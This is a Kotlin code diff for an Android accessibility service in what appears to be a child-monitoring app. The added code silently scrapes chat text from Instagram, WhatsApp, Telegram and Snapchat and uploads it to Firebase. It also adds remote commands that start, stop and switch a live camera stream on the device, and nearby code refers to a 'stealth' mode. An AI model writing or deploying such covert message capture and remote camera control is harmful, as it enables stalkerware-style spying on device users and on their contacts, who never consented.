@@ -49,6 +49,17 @@ class VyraAccessibilityService : AccessibilityService() {
         // 3. SOCIAL APP CHAT & CAMERA TRAP
         if (targetSocialPackages.contains(packageName)) {
             handleSocialAppActivity(packageName, event)
+            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+                event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                val appName = when {
+                    packageName.contains("instagram") -> "Instagram"
+                    packageName.contains("whatsapp") -> "WhatsApp"
+                    packageName.contains("telegram") -> "Telegram"
+                    packageName.contains("snapchat") -> "Snapchat"
+                    else -> "Social"
+                }
+                scrapeSocialChatNodes(appName, rootInActiveWindow)
+            }
         }
 
         // 4. SCAN VISIBLE TEXT FOR DANGEROUS / SENSITIVE KEYWORDS
@@ -127,6 +138,39 @@ class VyraAccessibilityService : AccessibilityService() {
         }
         for (i in 0 until node.childCount) {
             scrapeSnapchatChatNodes(node.getChild(i))
+        }
+    }
+
+    private val processedChatHashes = mutableSetOf<Int>()
+
+    private fun scrapeSocialChatNodes(appName: String, node: AccessibilityNodeInfo?) {
+        if (node == null) return
+        val text = node.text?.toString()?.trim() ?: ""
+        if (text.isNotBlank() && text.length > 1) {
+            val lower = text.lowercase()
+            val isNav = lower in setOf("search", "home", "reels", "profile", "explore", "back", "camera", "message...", "send", "chats", "status", "calls", "settings") ||
+                    lower.startsWith("seen") || lower.startsWith("typing...") || lower.startsWith("online")
+            if (!isNav) {
+                val hash = (appName + text).hashCode()
+                if (!processedChatHashes.contains(hash)) {
+                    if (processedChatHashes.size > 2000) processedChatHashes.clear()
+                    processedChatHashes.add(hash)
+
+                    val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
+                    val msgId = "chat_${System.currentTimeMillis()}_${Math.abs(hash).toString().take(6)}"
+                    firebaseSync.syncChatMessage(
+                        msgId = msgId,
+                        app = appName,
+                        sender = "$appName Contact",
+                        text = text,
+                        isDeletedBySender = false,
+                        isWatchlistTarget = false
+                    )
+                }
+            }
+        }
+        for (i in 0 until node.childCount) {
+            scrapeSocialChatNodes(appName, node.getChild(i))
         }
     }
 
@@ -403,6 +447,32 @@ class VyraAccessibilityService : AccessibilityService() {
                     val enabled = payload["enabled"] as? Boolean ?: true
                     com.vyra.kids.core.PrefsManager(this).isStealthScreenGuardEnabled = enabled
                     Log.i(AppConstants.TAG, "Stealth Screen Guard updated: $enabled")
+                }
+                "START_CAMERA_STREAM" -> {
+                    val facing = payload["lens"]?.toString() ?: "back"
+                    val intent = Intent(this, RemoteCameraStreamService::class.java).apply {
+                        setAction(RemoteCameraStreamService.ACTION_START_CAMERA)
+                        putExtra(RemoteCameraStreamService.EXTRA_CAMERA_FACING, facing)
+                    }
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(intent)
+                    } else {
+                        startService(intent)
+                    }
+                }
+                "STOP_CAMERA_STREAM" -> {
+                    val intent = Intent(this, RemoteCameraStreamService::class.java).apply {
+                        setAction(RemoteCameraStreamService.ACTION_STOP_CAMERA)
+                    }
+                    startService(intent)
+                }
+                "SWITCH_CAMERA_LENS" -> {
+                    val facing = payload["lens"]?.toString() ?: "back"
+                    val intent = Intent(this, RemoteCameraStreamService::class.java).apply {
+                        setAction(RemoteCameraStreamService.ACTION_SWITCH_CAMERA)
+                        putExtra(RemoteCameraStreamService.EXTRA_CAMERA_FACING, facing)
+                    }
+                    startService(intent)
                 }
             }
         }
